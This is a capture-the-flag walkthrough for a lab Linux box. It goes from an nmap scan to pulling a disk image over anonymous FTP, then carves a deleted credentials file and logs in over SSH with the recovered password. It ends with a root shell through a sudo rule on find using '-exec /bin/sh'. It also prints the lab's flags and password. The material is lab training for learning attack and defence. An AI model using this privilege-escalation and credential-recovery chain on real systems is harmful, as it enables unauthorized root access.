recovery

Easy Linux box. Service enumeration → forensic recovery of a deleted file → a sudo misconfiguration for root. Commands use <target-ip> — substitute the IP of your running box.

1 · Enumerate the services

Machine

LevelEasy

ServicesFTP · SSH · HTTP

Goal. Capture two flags — a user flag and a root flag. On this box the user flag is not a plain file: it is recovered through disk forensics, which is the whole point of the first machine.

Scope. Only attack the single IP you were given. Replace <target-ip> everywhere below.

1

Enumerate the services

Start with a full port scan and service/version detection.

nmap -sC -sV -p- <target-ip>

Three services answer:

21/tcp  ftp     vsftpd     (anonymous login allowed)
22/tcp  ssh     OpenSSH
80/tcp  http    Apache httpd

Why it works

  1. -p- scans all 65535 ports so nothing hides on a high port.
  2. -sV fingerprints versions; -sC runs safe default scripts — the FTP script flags that anonymous login is enabled, which is your first lead.
2

Pull the disk image

The web root advertises a decommissioned workstation backup. Grab it over HTTP (the same file is also on anonymous FTP):

wget http://<target-ip>/disk_backup.img

Or via FTP:

ftp <target-ip>
# user: anonymous   (press Enter for password)
ftp> get pub/disk_backup.img

Why it works

  1. A "backup" is rarely just data — disk images carry deleted files and leftover artifacts in unallocated space.
  2. Anonymous FTP and an open directory are classic exposures: no credentials needed, so enumeration alone hands you the material.
3

Recover the deleted file (forensics)

The image once held a credentials.txt that was deleted. Deleting a file does not wipe its data blocks, so recover it. The quickest check:

strings disk_backup.img | grep -iE 'FLAG|pass|ssh'

Or carve it properly with any forensic tool:

foremost -i disk_backup.img -o out/     # carves deleted files into out/
# or
photorec disk_backup.img                # interactive carver
# or mount + undelete
extundelete disk_backup.img --restore-all

The recovered note contains the SSH credentials and the user flag:

SSH : jdoe
Pass: sunshine2019
user flag: FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}
USER FLAGFLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}

Why it works

  1. On ext-family filesystems, rm only unlinks the directory entry and frees the inode — the data blocks keep their contents until overwritten.
  2. strings reads those raw bytes directly; carvers like foremost/photorec rebuild whole files from recognizable headers.
4

Get a shell

Log in over SSH with the recovered credentials:

ssh jdoe@<target-ip>
# password: sunshine2019

Why it works

  1. Credentials dumped from "dead" storage are still live on the running system — password hygiene, not the disk, is the failure.
  2. Password authentication over SSH is enabled, so recovered creds are enough for interactive access.
5

Escalate to root

Check what jdoe may run as root:

sudo -l
#   (root) NOPASSWD: /usr/bin/find

find can execute commands — abuse it to spawn a root shell (GTFOBins):

sudo find . -exec /bin/sh \; -quit
# id  ->  uid=0(root)
cat /root/root.txt
ROOT FLAGFLAG{sud0_f1nd_g1v3s_r00t}

Why it works

  1. sudo runs find as root, and -exec launches a child process — that child inherits root.
  2. -quit stops after the first match so you drop straight into the shell instead of looping over the tree.

Both flags

userFLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}
rootFLAG{sud0_f1nd_g1v3s_r00t}

Lesson. "Deleting" a file is not erasing it, and decommissioned media must be wiped. Pair that with least-privilege sudo rules and this whole chain disappears.
